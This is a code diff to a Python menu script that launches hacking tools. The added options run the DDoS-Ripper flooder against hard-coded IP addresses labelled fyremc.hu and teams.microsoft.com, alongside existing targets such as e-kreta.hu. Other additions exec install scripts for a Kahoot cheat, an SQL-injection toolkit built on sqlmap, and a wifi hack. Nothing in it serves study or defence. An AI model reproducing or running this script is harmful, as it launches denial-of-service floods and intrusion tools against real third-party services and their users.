@@ -29,6 +29,8 @@ if answer1 == "1":
     print("[3]: run for youtube.com")
     print("[4]: run for mozaweb.com")
     print("[5]: run for e-kreta.hu")
+    print("[6]: run for fyremc.hu")
+    print("[7]: run for teams.microsoft.com")
     answer2 = input("Choose from the list (only number): ")
 
     if answer2 == "1":
@@ -50,26 +52,56 @@ if answer1 == "1":
     if answer2 == "5":
         os.chdir("DDoS-Ripper")
         os.system('python3 DRipper.py -s 84.206.125.40 -t 135')
+
+    if answer2 == "6":
+        os.chdir("DDoS-Ripper")
+        os.system('python3 DRipper.py -s 172.67.202.5 -t 135')
+
+    if answer2 == "7":
+        os.chdir("DDoS-Ripper")
+        os.system('python3 DRipper.py -s 52.113.194.132 -t 135')
     
 if answer1 == "2":
-    print("[1]: start")
+    print("[1]: install")
+    print("[2]: start")
     answer3 = input("Choose from the list (only number): ")
 
-    if answer3 == "1":   
+    if answer3 == "1":
+         import installkahootcheat
+         exec(open("installkahootcheat.py").read())
+
+    if answer3 == "2":   
         os.chdir("kahoot-cheats")
         os.system('python3 main.py')
     
 if answer1 == "3":
     print("only working in PC (copy the source file called command.js, and paste it to f12/console)")
+    print("[1]: install")
+    print("[2]: options")
+    answer6 = input("Choose from the list (only number): ")
+    if answer6 == "1":
+        import installsqlhack
+        exec(open("installsqlhack.py").read())
+
+    if answer6 == "2":
+        os.chdir("sql-hack")
+        os.system('python sqlmap.py -h')
+        time.sleep(8)
+        os.system('python sqlmap.py -hh')
 
 if answer1 == "4":
     print("soon")
 
 if answer1 == "5":
-    print("[1]: start")
+    print("[1]: install")
+    print("[2]: start")
     answer4 = input("Choose from the list (only number): ")
 
     if answer4 == "1":
+        import installwifihack1
+        exec(open("installwifihack1.py").read())
+
+    if answer4 == "2":
         print("ONLY WORKING WHEN YOU RUN THE CODE IN NETHUNTER (LINUX CONSOLE)")
         print("[1]: start")
         print("[2]: install packages")
